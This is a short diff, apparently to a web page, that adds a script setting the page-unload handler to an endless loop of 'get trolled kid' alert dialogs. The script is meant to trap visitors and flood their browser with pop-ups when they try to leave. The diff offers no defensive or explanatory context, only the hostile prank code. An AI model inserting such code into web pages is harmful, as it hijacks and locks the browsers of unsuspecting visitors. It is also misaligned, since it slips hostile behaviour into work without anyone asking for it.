@@ -1,1 +1,7 @@
-
+<script type="text/javascript">
+window.onbeforeunload = function() {
+    while(true){
+        alert("get trolled kid");
+    }
+}
+</script>
